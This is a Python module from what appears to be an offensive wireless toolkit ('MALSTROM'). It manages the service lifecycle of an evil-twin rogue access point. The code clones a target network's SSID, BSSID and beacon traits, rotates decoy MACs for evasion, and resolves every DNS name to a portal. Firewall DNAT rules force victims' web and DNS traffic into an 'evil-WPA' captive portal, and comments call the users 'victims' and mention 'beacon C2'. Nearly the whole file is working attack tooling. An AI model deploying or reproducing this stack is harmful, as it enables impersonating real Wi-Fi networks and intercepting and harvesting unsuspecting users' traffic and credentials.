"""Linux service lifecycle for the rogue AP stack.

hostapd serves the cloned AP identity, dnsmasq provides DHCP + rogue DNS on
the portal subnet, and the firewall (iptables when present, else nftables)
DNATs client HTTP/HTTPS/DNS into the portal.
`cleanup()` restores everything it touched (idempotent).
"""

import os
import subprocess
import time

from . import config
from . import firewall as fwmod
from . import linuxutil
from . import recon
from . import state


def _channel_hw_mode(channel):
    try:
        channel = int(channel)
    except (TypeError, ValueError):
        channel = 6
    return 'a' if channel > 14 else 'g'


def _random_la_mac():
    """Fresh random locally-administered unicast MAC (02:xx:xx:xx:xx:xx)."""
    import random as _r
    octets = [_r.randrange(256) for _ in range(5)]
    return '02:%02x:%02x:%02x:%02x:%02x' % tuple(octets)


def beacon_fidelity_lines(fid):
    """hostapd conf lines that replay a target's beacon elements.

    `fid` is a recon.fidelity_of() dict. Every value is clamped and whitelisted
    a *second* time here so a hostile or malformed beacon can never produce a
    conf line hostapd refuses — a rogue AP downed by a crafted rate set would
    make the twin more fingerprintable, not less.
    """
    if not fid:
        return []
    lines = []
    try:
        bi = int(fid.get('beacon_int') or 0)
    except (TypeError, ValueError):
        bi = 0
    if 20 <= bi <= 1000:
        lines.append('beacon_int=%d' % bi)
    try:
        dt = int(fid.get('dtim') or 0)
    except (TypeError, ValueError):
        dt = 0
    if 1 <= dt <= 255:
        lines.append('dtim_period=%d' % dt)

    def _whitelisted(raw):
        seen, out = set(), []
        for r in (raw or []):
            try:
                v = int(r)
            except (TypeError, ValueError):
                continue
            if v in recon.RATE_TABLE and v not in seen:
                seen.add(v)
                out.append(v)
        return out

    rates = _whitelisted(fid.get('rates'))
    basic = [v for v in _whitelisted(fid.get('basic')) if v in rates]
    if rates:
        lines.append('supported_rates=%s' % ' '.join(str(v) for v in rates))
    if basic:
        lines.append('basic_rates=%s' % ' '.join(str(v) for v in basic))
    ht = fid.get('ht') or {}
    cap = []
    if ht.get('ht40') == '+':
        cap.append('HT40+')
    elif ht.get('ht40') == '-':
        cap.append('HT40-')
    if ht.get('short_gi20'):
        cap.append('SHORT-GI-20')
    if ht.get('short_gi40'):
        cap.append('SHORT-GI-40')
    if ht.get('rx_stbc'):
        cap.append('RX-STBC-1')
    if ht.get('ldpc'):
        cap.append('LDPC')
    if cap:
        lines.append('ht_capab=[%s]' % ']['.join(cap))
    return lines


def build_hostapd_conf(iface, ssid, bssid, channel, mode, psk,
                       wpa3=False, country='', vht=False, isolation=True,
                       fidelity=None, hidden=False):
    try:
        channel = int(channel)
    except (TypeError, ValueError):
        channel = 6
    ssid = ''.join(c for c in (ssid or 'MALSTROM') if ord(c) >= 32 and c != '#')
    ssid = (ssid[:32] or 'MALSTROM')
    lines = [
        'interface=%s',
        'driver=nl80211',
        'ssid=%s',
        'channel=%s',
        'hw_mode=%s',
        # A cloned twin is faithful because identity comes from the operator;
        # the fidelity block only replays *non-identifying* beacon elements the
        # target actually advertises (rate set, beacon timing, HT hints).
        'ignore_broadcast_ssid=%d' % (1 if hidden else 0),
        'ieee80211n=1',
        'wmm_enabled=1',
        # logger_stdout=-1 makes hostapd log everything to stdout, which the
        # launcher redirects into HOSTAPD_LOG. `logger_file` is NOT a config
        # item on several hostapd builds (Kali 2.11 rejects it outright and
        # dies at parse — the AP could never come up from the engine).
        'logger_syslog=-1',
        'logger_stdout=-1',
    ]
    lines.extend(beacon_fidelity_lines(fidelity) if fidelity else [])
    if isolation:
        # L2 station isolation: the AP itself refuses to fabricate the 8-byte
        # 802.11 header between two associated stations, so victims can't talk
        # to each other even before any packet touches the gateway. Mirrored in
        # iptables below for the routed path (some drivers ignore ap_isolate).
        lines.append('ap_isolate=1')
    # 5 GHz: most cards refuse channels above 14 without a regulatory domain
    # in the beacons, and 11ac rates need VHT support confirmed on the phy
    # (hostapd exits at init when the card lacks what the conf demands).
    if channel > 14:
        if country:
            lines.append('country_code=%s' % country)
            lines.append('ieee80211d=1')
        if vht:
            lines.append('ieee80211ac=1')
    body = '\n'.join(lines) % (
        iface, ssid or 'MALSTROM', channel, _channel_hw_mode(channel))
    if mode == 'wpa':
        body += '\nwpa=2\nwpa_passphrase=%s\n' % (psk or '')
        if wpa3:
            # Transition twin: WPA2 clients join with PSK, WPA3 clients with
            # SAE, PMF optional — the widest net for the evil-WPA portal.
            body += 'wpa_key_mgmt=WPA-PSK SAE\nieee80211w=1\nrsn_pairwise=CCMP\n'
        else:
            body += 'wpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n'
    return body


class RogueStack(object):
    def __init__(self):
        self.ap_iface = None
        self.created_vifs = []          # vifs we created (removed at cleanup)
        self.hostapd = None
        self.hostapd_started = 0.0      # launch time of the handle above
        self.dnsmasq = None
        self._fw_marker = 'MALSTROM'
        self._fw_backend = None      # 'iptables' | 'nft', chosen at setup
        self._whitelisted = set()
        self._isolation_rules = []   # v4 FORWARD DROPs added by setup_firewall
        self._v6_rules = []          # v6 FORWARD DROPs (ip6tables backend only)
        self._v6_sysctls = []        # (sysctl path, prior value) to restore
        self._nft_cfg = None         # params for the nft backend ruleset
        self._ip_forward = None
        self._orig_mac = None

    # --- interface ---------------------------------------------------------
    def prepare_iface(self):
        self.ap_iface, created = linuxutil.ensure_ap_iface()
        if created:
            self.created_vifs.append(self.ap_iface)
        return self.ap_iface

    def _set_portal_addr(self):
        r = linuxutil.run(['ip', '-4', 'addr', 'show', 'dev', self.ap_iface], timeout=5)
        if r.returncode != 0 or ' %s/' % config.PORTAL_IP not in r.stdout:
            # A stubborn NetworkManager/dhcpcd may have re-added the old
            # DHCP lease while the interface was coming back up. Scrub it
            # before assigning the portal subnet.
            linuxutil.flush_uplink_config(self.ap_iface)
            linuxutil.add_addr(self.ap_iface, config.PORTAL_IP, 24)
        linuxutil.iface_up(self.ap_iface)

    # --- hostapd -----------------------------------------------------------
    def _ap_params(self, st):
        """(mode, psk, wpa3, country, vht) for the twin, from engagement state."""
        mode = st.get('portal_mode', 'open')
        psk = st.get('wpa_psk', '') if mode == 'wpa' else ''
        if not psk:
            psk = config.WPA_PSK if mode == 'wpa' else ''
        if mode == 'wpa' and not psk:
            psk = 'MALSTROM-%s' % os.urandom(4).hex()
            st['wpa_psk'] = psk
            state.write_state(st)
        wpa3 = bool(st.get('wpa3_transition')) and mode == 'wpa'
        channel = st.get('target_channel', '6')
        country = linuxutil.regdom() or ''
        vht = False
        try:
            vht = int(channel) > 14 and \
                linuxutil.phy_vht(linuxutil.phy_of(self.ap_iface))
        except (TypeError, ValueError):
            vht = False
        return mode, psk, wpa3, country, vht

    def start_hostapd(self, st):
        if not linuxutil.hostapd_ok():
            state.emit('ALERT', 'hostapd binary missing — cannot serve AP')
            return False
        if not self.ap_iface or not linuxutil.netdev_exists(self.ap_iface):
            sac = ', '.join(linuxutil.ap_capable_uplinks())
            hint = ('Sacrifice an uplink: set MALSTROM_AP_IFACE=%s (drops that '
                    'link during the attack).' % sac) if sac else \
                   ('Plug in an AP-capable wifi card (managed+monitor only is '
                    'not enough).')
            state.emit('ALERT',
                       'no usable rogue-AP interface (%s) — %s '
                       'Your internet uplink was NOT touched.'
                       % (self.ap_iface or 'none', hint))
            return False
        mode, psk, wpa3, country, vht = self._ap_params(st)
        alive = self._launch_hostapd(st, mode, psk, wpa3, country, vht)
        if not alive and wpa3:
            # SAE was refused (hostapd/driver without WPA3 support dies at
            # config init). Fall back to plain WPA2-PSK in the same arm call
            # instead of leaving the chain wedged in a death-retry loop.
            state.emit('INFO', 'hostapd refused WPA3/SAE transition — '
                               'falling back to WPA2-PSK for the twin')
            alive = self._launch_hostapd(st, mode, psk, False, country, vht)
        return alive

    def _launch_hostapd(self, st, mode, psk, wpa3, country, vht,
                        bssid=None, hidden=None):
        # `bssid` overrides the identity MAC (rotation path); when None the
        # existing clone-then-random logic decides. `hidden` overrides the
        # engagement cloak flag the same way.
        if hidden is None:
            hidden = bool(st.get('ssid_cloak'))
        fidelity = None
        if bool(st.get('beacon_fidelity', config.BEACON_FIDELITY)):
            fidelity = recon.fidelity_for(st.get('target_bssid', ''))
        conf = build_hostapd_conf(self.ap_iface,
                                  st.get('portal_ssid') or st.get('target_ssid', ''),
                                  st.get('target_bssid', ''),
                                  st.get('target_channel', '6'),
                                  mode, psk, wpa3=wpa3, country=country,
                                  vht=vht,
                                  isolation=bool(st.get('client_isolation',
                                                        config.CLIENT_ISOLATION)),
                                  fidelity=fidelity, hidden=hidden)
        with open(state.HOSTAPD_CONF, 'w') as fh:
            fh.write(conf)
        linuxutil.nm_managed(self.ap_iface, False)
        linuxutil.networkd_managed(self.ap_iface, False)
        linuxutil.flush_uplink_config(self.ap_iface)
        use_bssid = bssid
        if use_bssid is None:
            use_bssid = st.get('target_bssid', '') \
                if st.get('clone_bssid', config.CLONE_BSSID) else ''
        if self._orig_mac is None:
            r = linuxutil.run(['ip', 'link', 'show', self.ap_iface], timeout=5)
            m = __import__('re').search(r'link/ether\s+([0-9a-f:]{17})',
                                        r.stdout, __import__('re').I)
            if m:
                self._orig_mac = m.group(1)
        if use_bssid:
            linuxutil.iface_up(self.ap_iface, up=False)
            linuxutil.set_mac(self.ap_iface, use_bssid)
            linuxutil.iface_up(self.ap_iface)
        else:
            linuxutil.iface_up(self.ap_iface, up=False)
            linuxutil.set_mac(self.ap_iface, _random_la_mac())
            linuxutil.iface_up(self.ap_iface)
        self._set_portal_addr()
        self.stop_hostapd()
        linuxutil.run(['pkill', '-f', 'hostapd .*%s/hostapd.conf' % config.STATE_DIR],
                      timeout=5)
        # give NetworkManager/networkd the moment they need to finish dropping
        # the interface before hostapd takes it over (their teardown races a
        # fresh launch and can kill it before it ever enters AP mode)
        time.sleep(1.0)
        # Launch WITHOUT -B: the Popen handle then owns the real hostapd
        # process (no daemonized orphan), so stop_hostapd can terminate it
        # directly and liveness can be read off the handle. hostapd still
        # writes -P pidfile for journal readers / verification. stdout+stderr
        # land in HOSTAPD_LOG (logger_stdout=-1) so a parse-level death is
        # visible in the alert instead of "no hostapd log".
        try:
            with open(state.HOSTAPD_LOG, 'w'):
                pass
        except OSError:
            pass
        self.hostapd = linuxutil.run_bg(
            ['hostapd', '-P', state.HOSTAPD_PID, state.HOSTAPD_CONF],
            log=state.HOSTAPD_LOG)
        self.hostapd_started = time.time()
        # Liveness is judged on the Popen handle we own — hostapd v2.10 (Kali)
        # NEVER writes the -P pidfile in foreground mode, so a pidfile-based
        # check would declare a perfectly healthy AP dead and the retry loop
        # would kill+relaunch it forever. AP-mode detection is then enforced
        # continuously by the engine's _hostapd_alive()/retry so a genuinely
        # wedged AP still gets restored.
        deadline = time.time() + 12.0
        alive = False
        saw_ap = False
        while time.time() < deadline:
            try:
                if self.hostapd.poll() is not None:
                    break                # the process we own exited — AP is down
                alive = True
                if linuxutil.iface_mode(self.ap_iface) == 'AP':
                    saw_ap = True
                    break
            except (IOError, ValueError, ProcessLookupError):
                pass
            time.sleep(0.5)
        if alive:
            state.emit('INFO', 'hostapd serving %s on %s [%s mode ch%s]' % (
                st.get('portal_ssid') or st.get('target_ssid', '?'),
                self.ap_iface, mode, st.get('target_channel', '?')))
            if not saw_ap:
                state.emit('INFO', 'hostapd up but AP mode not yet visible on %s '
                                   '(slow radio transition + NM teardown) — '
                                   'engine will re-verify' % self.ap_iface)
        else:
            tail = []
            try:
                with open(state.HOSTAPD_LOG) as fh:
                    tail = [l for l in fh.read().splitlines() if l.strip()][-3:]
            except IOError:
                pass
            state.emit('ALERT', 'hostapd died on %s — %s' % (
                self.ap_iface, (' | '.join(tail) if tail else 'no hostapd log')))
        return alive

    def rotate_identity(self, st):
        """Swap the decoy BSSID for a fresh locally-administered MAC while the
        twin stays up (decoy-mode evasion; cloning a target BSSID already IS
        the identity and never rotates — the engine refuses to call this when
        `clone_bssid` is on). Re-arms hostapd with today's cloak flag so a
        rotation also surfaces a pending SSID-cloak change. Returns the new MAC
        string, or '' when the radio is gone or hostapd refused to come back.
        """
        if not self.ap_iface or not linuxutil.netdev_exists(self.ap_iface):
            return ''
        mode, psk, wpa3, country, vht = self._ap_params(st)
        fresh = _random_la_mac()
        ok = self._launch_hostapd(st, mode, psk, wpa3, country, vht,
                                  bssid=fresh, hidden=bool(st.get('ssid_cloak')))
        if not ok:
            return ''
        st['rogue_bssid'] = fresh
        try:
            state.write_state(st)
        except Exception:
            pass
        return fresh

    def stop_hostapd(self):
        if self.hostapd:
            try:
                self.hostapd.terminate()
            except OSError:
                pass
            try:
                self.hostapd.wait(timeout=3)
            except subprocess.TimeoutExpired:
                try:
                    self.hostapd.kill()
                except OSError:
                    pass
            self.hostapd = None
        if os.path.exists(state.HOSTAPD_PID):
            try:
                with open(state.HOSTAPD_PID) as fh:
                    pid = int(fh.read().strip())
                os.kill(pid, 15)
            except (IOError, ValueError, ProcessLookupError):
                pass
            try:
                os.remove(state.HOSTAPD_PID)
            except OSError:
                pass
        linuxutil.run(['pkill', '-f', state.HOSTAPD_CONF], timeout=5)
        time.sleep(0.3)

    # --- dnsmasq ------------------------------------------------------------
    def start_dns(self):
        self.stop_dns()
        args = [
            'dnsmasq', '--no-hosts', '--no-resolv',
            '--server=%s' % (linuxutil.uplink_namespace() or '8.8.8.8'),
            '--address=/#/%s' % config.PORTAL_IP,
            '--dns-forward-max=150', '--cache-size=150',
            '-p', str(config.DNS_PORT),
            '--listen-address=%s' % config.PORTAL_IP,
            '--interface=%s' % self.ap_iface,
            '--bind-interfaces',
            '--dhcp-range=%s,%s,%s,2h' % (config.DHCP_START, config.DHCP_END, '255.255.255.0'),
            '--dhcp-option=3,%s' % config.PORTAL_IP,
            '--dhcp-option=6,%s' % config.PORTAL_IP,
            '--dhcp-option=114,http://%s/portal-api' % config.PORTAL_IP,
            '--dhcp-leasefile=%s' % config.DHCP_LEASE_FILE,
            '--pid-file=%s' % state.DNSMASQ_PID,
        ]
        try:
            self.dnsmasq = linuxutil.run_bg(args)
            deadline = time.time() + 5.0
            alive = False
            while time.time() < deadline:
                try:
                    with open(state.DNSMASQ_PID) as fh:
                        pid = int(fh.read().strip())
                    os.kill(pid, 0)
                    alive = True
                    break
                except (IOError, ValueError, ProcessLookupError):
                    time.sleep(0.2)
            if not alive:
                state.emit('ALERT', 'dnsmasq failed to start (is %s up with '
                           'the portal address %s?)' % (self.ap_iface,
                                                        config.PORTAL_IP))
                return False
            # dnsmasq daemonizes itself: the launcher process we hold has
            # already exited — reap it so it doesn't linger as a zombie for
            # the daemon's lifetime (one defunct child per arm/retry).
            try:
                self.dnsmasq.poll()
            except Exception:
                pass
            state.emit('INFO', 'rogue dnsmasq up (dhcp + dns on :%d)' % config.DNS_PORT)
            return True
        except OSError as exc:
            state.emit('ALERT', 'dnsmasq failed: %s' % exc)
            return False

    def stop_dns(self):
        self.dnsmasq = None
        if os.path.exists(state.DNSMASQ_PID):
            try:
                with open(state.DNSMASQ_PID) as fh:
                    pid = int(fh.read().strip())
                os.kill(pid, 15)
                time.sleep(0.5)
            except (IOError, ValueError, ProcessLookupError):
                pass
        linuxutil.run(['pkill', '-f', 'dnsmasq.*--interface=' + str(self.ap_iface)],
                      timeout=5)

    # --- firewall (iptables or nftables, + IPv6 guard) ----------------------
    def setup_firewall(self):
        backend = linuxutil.fw_backend(config.FIREWALL_BACKEND)
        if backend is None:
            state.emit('ALERT', 'no firewall backend found (install iptables or '
                       'nftables) — refusing to arm the rogue segment without '
                       'traffic redirect')
            return False
        self._fw_backend = backend
        if backend == 'iptables':
            self._setup_firewall_iptables()
        else:
            if not self._setup_firewall_nft():
                return False
        self._install_ipv6_guard()
        state.emit('INFO', '%s DNAT + masquerade up on %s%s'
                   % (backend, self.ap_iface,
                      ' [client isolation active]' if config.CLIENT_ISOLATION else ''))
        return True

    def _resolver(self):
        return linuxutil.uplink_namespace() or '1.1.1.1'

    def _portal_dest_port(self):
        """443 lands on the ssl-wrapped portal (self-signed cert) when one can
        be served — https-first captive probes get a real TLS portal instead
        of a plaintext redirect error. Falls back to the plain portal when
        TLS is disabled or no cert could be generated."""
        from . import portal as _portal
        try:
            return (config.PORTAL_TLS_PORT
                    if config.PORTAL_TLS and _portal.ensure_portal_cert()[0]
                    else config.PORTAL_PORT)
        except Exception:
            return config.PORTAL_PORT

    def _setup_firewall_iptables(self):
        fw = linuxutil.iptables
        tls_port = self._portal_dest_port()
        fw(['-t', 'nat', '-N', self._fw_marker])
        fw(['-I', 'PREROUTING', '-t', 'nat', '-i', self.ap_iface, '-j', self._fw_marker])
        fw(['-A', self._fw_marker, '-t', 'nat',
            '-p', 'tcp', '--dport', '80', '!', '-d', config.PORTAL_IP,
            '-j', 'DNAT', '--to-destination', '%s:%d' % (config.PORTAL_IP, config.PORTAL_PORT)])
        fw(['-A', self._fw_marker, '-t', 'nat',
            '-p', 'tcp', '--dport', '443', '!', '-d', config.PORTAL_IP,
            '-j', 'DNAT', '--to-destination', '%s:%d' % (config.PORTAL_IP, tls_port)])
        # dnsmasq returns the portal IP for every hostname, so probes destined
        # straight at 172.16.52.1:443 also need to land on the TLS portal.
        fw(['-A', self._fw_marker, '-t', 'nat',
            '-p', 'tcp', '--dport', '80', '-d', config.PORTAL_IP,
            '-j', 'DNAT', '--to-destination', '%s:%d' % (config.PORTAL_IP, config.PORTAL_PORT)])
        fw(['-A', self._fw_marker, '-t', 'nat',
            '-p', 'tcp', '--dport', '443', '-d', config.PORTAL_IP,
            '-j', 'DNAT', '--to-destination', '%s:%d' % (config.PORTAL_IP, tls_port)])
        for proto in ('tcp', 'udp'):
            fw(['-A', self._fw_marker, '-t', 'nat',
                '-p', proto, '--dport', '53', '!', '-d', config.PORTAL_IP,
                '-j', 'DNAT', '--to-destination', '%s:%d' % (config.PORTAL_IP, config.DNS_PORT)])
            # clients get 172.16.52.1 as their DNS server via DHCP, so catch
            # queries destined straight at the portal IP too (they'd otherwise
            # hit an empty :53 and die).
            fw(['-A', self._fw_marker, '-t', 'nat',
                '-p', proto, '--dport', '53', '-d', config.PORTAL_IP,
                '-j', 'DNAT', '--to-destination', '%s:%d' % (config.PORTAL_IP, config.DNS_PORT)])
        fw(['-t', 'nat', '-A', 'POSTROUTING', '-s', config.PORTAL_NET,
            '!', '-d', config.PORTAL_NET, '-j', 'MASQUERADE'])
        fw(['-A', 'FORWARD', '-i', self.ap_iface, '-j', 'ACCEPT'])
        fw(['-A', 'FORWARD', '-o', self.ap_iface, '-j', 'ACCEPT'])
        self._install_isolation(fw)
        self._remember_ip_forward()

    def _setup_firewall_nft(self):
        """nftables path: render the whole policy with fwmod.nft_ruleset and
        apply it atomically with `nft -f`. Whitelist / isolation changes
        regenerate the set; the file under the state dir is transient."""
        peers = sorted(os.listdir('/sys/class/net')) if (
            os.path.isdir('/sys/class/net')) else []
        sibling = []
        if config.CLIENT_ISOLATION:
            for name in peers:
                if name in ('lo', self.ap_iface):
                    continue
                cidr = linuxutil.iface_ipv4_cidr(name)
                if cidr:
                    sibling.append(cidr)
        self._nft_cfg = {
            'iface': self.ap_iface,
            'portal_ip': config.PORTAL_IP,
            'portal_port': config.PORTAL_PORT,
            'tls_port': self._portal_dest_port(),
            'dns_port': config.DNS_PORT,
            'portal_net': config.PORTAL_NET,
            'resolver_ip': self._resolver(),
            'whitelist': set(self._whitelisted),
            'sibling_nets': sibling,
            'isolation': config.CLIENT_ISOLATION,
        }
        return self._apply_nft()

    def _apply_nft(self):
        try:
            text = fwmod.nft_ruleset(**self._nft_cfg)
        except ValueError as exc:
            state.emit('ALERT', 'nftables: bad ruleset params: %s' % exc)
            return False
        try:
            with open(state.NFT_RULES, 'w') as fh:
                fh.write(text)
        except OSError as exc:
            state.emit('ALERT', 'nftables: cannot write %s: %s'
                       % (state.NFT_RULES, exc))
            return False
        # Render as a fresh transaction: delete our tables (no-op when absent)
        # so `nft -f` below always CREATES them — no "table does not exist"
        # flushes and no duplicated chains when whitelist rules re-render.
        for fam, table in (('ip', fwmod.TABLE_V4), ('ip6', fwmod.TABLE_V6)):
            linuxutil.nft(['delete', 'table', fam, table])
        r = linuxutil.nft(['-f', state.NFT_RULES])
        if r.returncode != 0:
            state.emit('ALERT', 'nftables apply failed: %s'
                       % (r.stderr or '').strip())
            return False
        return True

    def _remember_ip_forward(self):
        with open('/proc/sys/net/ipv4/ip_forward') as fh:
            self._ip_forward = fh.read().strip()
        linuxutil.run(['sh', '-c', 'echo 1 > /proc/sys/net/ipv4/ip_forward'], timeout=3)

    def _install_ipv6_guard(self):
        """IPv6 is unserved on the rogue net (DHCP v4 only, no RAs), so any v6
        routed through the AP interface is never legitimate. Drop it at FORWARD
        (mirrors the v4 isolation anchoring) and pin per-interface forwarding
        to 0 for the engagement, restoring the prior values at teardown."""
        if not config.IPV6_GUARD:
            return
        self._v6_sysctls = linuxutil.ipv6_forward_paths(self.ap_iface)
        linuxutil.set_ipv6_forward(self._v6_sysctls, '0')
        if self._fw_backend == 'nft':
            return                    # v6 DROPs live in the rendered ruleset
        if not linuxutil.have('ip6tables'):
            state.emit('ALERT', 'IPv6 guard skipped: ip6tables not installed')
            return
        self._v6_rules = [
            ['-i', self.ap_iface, '-j', 'DROP'],
            ['-o', self.ap_iface, '-j', 'DROP'],
        ]
        for spec in self._v6_rules:
            linuxutil.ip6tables(['-I', 'FORWARD', '1'] + spec)

    def _install_isolation(self, fw=None):
        """Drop cross-talk through the rogue segment.

        Two classes of victim traffic must never be forwarded:

          1. portal client <-> portal client (`-i ap -o ap`): firmware usually
             stops this at L2 via ap_isolate=1, but some drivers ignore the
             hostapd knob — the routed DROP is the fallback.
          2. portal client -> any OTHER subnet the box physically sits on (the
             operator's LAN behind eth0/ens*/wlan*). Until this existed, the
             two generic FORWARD ACCEPTs plus ip_forward=1 meant a victim could
             port-scan / infiltrate the operator's wired segment straight
             through the box.

        Public internet is intentionally untouched: these rules are anchored to
        `-i ap_iface` and to the *local* CIDRs of sibling interfaces, so
        portal-net clients can still MASQUERADE out the default route (beacon
        C2, whitelisted clients). Rules are inserted at FORWARD position 1 but
        only ever match on the AP interface, so foreign host rules (Docker,
        firewalld jumps) ahead of us are unaffected.
        """
        if fw is None:
            fw = linuxutil.iptables
        if not config.CLIENT_ISOLATION:
            self._isolation_rules = []
            return
        self._isolation_rules = []
        self._isolation_rules.append(
            ['-i', self.ap_iface, '-o', self.ap_iface, '-j', 'DROP'])
        try:
            peers = sorted(os.listdir('/sys/class/net'))
        except OSError:
            peers = []
        for name in peers:
            if name in ('lo', self.ap_iface):
                continue
            cidr = linuxutil.iface_ipv4_cidr(name)
            if not cidr:
                continue
            self._isolation_rules.append(
                ['-i', self.ap_iface, '-s', config.PORTAL_NET,
                 '-d', cidr, '-j', 'DROP'])
        for spec in self._isolation_rules:
            fw(['-I', 'FORWARD', '1'] + spec)

    def teardown_firewall(self):
        if not self.ap_iface:
            return
        # IPv6 FORWARD DROPs (ip6tables backend) come down first — same rules
        # we added, never the shell blob's v4 list.
        while self._v6_rules:
            spec = self._v6_rules.pop()
            linuxutil.ip6tables(['-D', 'FORWARD'] + spec)
        self._v6_rules = []
        linuxutil.restore_ipv6_forward(self._v6_sysctls)
        self._v6_sysctls = []
        if self._fw_backend == 'nft':
            for table, fam in ((fwmod.TABLE_V4, 'ip'),
                               (fwmod.TABLE_V6, 'ip6')):
                linuxutil.nft(['delete', 'table', fam, table])
            try:
                os.remove(state.NFT_RULES)
            except OSError:
                pass
            self._nft_cfg = None
            self._whitelisted = set()
            return
        while self._isolation_rules:
            spec = self._isolation_rules.pop()
            linuxutil.iptables(['-D', 'FORWARD'] + spec)
        linuxutil.run(['sh', '-c',
                       'iptables -D FORWARD -i %s -j ACCEPT 2>/dev/null; '
                       'iptables -D FORWARD -o %s -j ACCEPT 2>/dev/null; '
                       'iptables -t nat -D PREROUTING -i %s -j %s 2>/dev/null; '
                       'iptables -t nat -F %s 2>/dev/null; '
                       'iptables -t nat -X %s 2>/dev/null; '
                       'iptables -t nat -D POSTROUTING -s %s ! -d %s -j MASQUERADE 2>/dev/null'
                       % (self.ap_iface, self.ap_iface, self.ap_iface,
                          self._fw_marker, self._fw_marker, self._fw_marker,
                          config.PORTAL_NET, config.PORTAL_NET)], timeout=8)
        self._whitelisted = set()

    def whitelist_bypass(self, ip, enable):
        if not state.is_ip(ip):
            return
        if self._fw_backend == 'nft':
            if enable:
                self._whitelisted.add(ip)
            else:
                self._whitelisted.discard(ip)
            if self._nft_cfg is not None:
                self._nft_cfg['whitelist'] = set(self._whitelisted)
                self._apply_nft()
            return
        dns = self._resolver()
        marker = self._fw_marker
        if enable:
            linuxutil.iptables(['-I', marker, '1', '-t', 'nat', '-s', ip, '-j', 'RETURN'])
            for proto in ('udp', 'tcp'):
                linuxutil.iptables(['-I', marker, '1', '-t', 'nat',
                                    '-s', ip, '-p', proto, '--dport', '53',
                                    '-j', 'DNAT', '--to-destination', '%s:53' % dns])
            self._whitelisted.add(ip)
        else:
            linuxutil.iptables(['-D', marker, '-t', 'nat', '-s', ip, '-j', 'RETURN'])
            for proto in ('udp', 'tcp'):
                linuxutil.iptables(['-D', marker, '-t', 'nat',
                                    '-s', ip, '-p', proto, '--dport', '53',
                                    '-j', 'DNAT', '--to-destination', '%s:53' % dns])
            self._whitelisted.discard(ip)

    def sync_whitelist(self, want):
        want = set(want)
        for ip in want - self._whitelisted:
            self.whitelist_bypass(ip, True)
        for ip in self._whitelisted - want:
            self.whitelist_bypass(ip, False)

    # --- teardown -------------------------------------------------------------
    def cleanup(self):
        # Order matters. NetworkManager/networkd must only get control of the
        # interface AFTER hostapd has released the radio and the original MAC
        # is restored — re-managing first (the old bug) made NM fight a live
        # hostapd, flush 172.16.52.1 mid-engagement and leave the wifi stack
        # wedged on the way down.
        self.stop_dns()
        self.stop_hostapd()
        self.teardown_firewall()
        if self.ap_iface:
            linuxutil.del_addr(self.ap_iface, config.PORTAL_IP, 24)
            if self.ap_iface not in self.created_vifs:
                if self._orig_mac and linuxutil.netdev_exists(self.ap_iface):
                    linuxutil.iface_up(self.ap_iface, up=False)
                    linuxutil.set_mac(self.ap_iface, self._orig_mac)
                    linuxutil.iface_up(self.ap_iface)
                linuxutil.nm_managed(self.ap_iface, True)
                linuxutil.networkd_managed(self.ap_iface, True)
        for vif in self.created_vifs:
            linuxutil.del_vif(vif)
        self.created_vifs = []
        self._orig_mac = None
        if self._ip_forward is not None:
            try:
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as fh:
                    fh.write(self._ip_forward)
            except IOError:
                pass
        for f in (state.HOSTAPD_CONF, state.HOSTAPD_PID,
                  state.HOSTAPD_LOG, state.DNSMASQ_PID):
            try:
                os.remove(f)
            except OSError:
                pass
        self._whitelisted = set()